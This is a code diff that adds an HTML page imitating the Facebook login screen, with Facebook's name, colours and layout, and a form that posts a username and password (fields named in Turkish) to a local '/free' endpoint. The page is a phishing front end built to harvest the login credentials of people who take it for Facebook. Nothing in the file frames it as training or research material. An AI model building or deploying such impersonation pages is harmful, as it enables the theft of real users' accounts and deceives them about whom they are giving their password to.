@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: #fff;
+            padding: 20px 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 350px;
+        }
+        .login-container h1 {
+            font-size: 36px;
+            color: #1877f2;
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        .login-container form .form-control {
+            margin-bottom: 15px;
+            height: 45px;
+            font-size: 16px;
+        }
+        .login-container form .btn {
+            background-color: #1877f2;
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            width: 100%;
+            height: 45px;
+        }
+        .login-container form .btn:hover {
+            background-color: #145db3;
+        }
+        .login-container p {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .login-container p a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .login-container p a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Facebook</h1>
+        <form action="/free" method="post">
+            <input type="text" class="form-control" name="isim" placeholder="Username" required>
+            <input type="password" class="form-control" name="şifre" placeholder="Password" required>
+            <button type="submit" class="btn btn-primary">Log In</button>
+        </form>
+        <p><a href="#">Forgotten account?</a> · <a href="#">Sign up for Facebook</a></p>
+    </div>
+</body>
+</html>
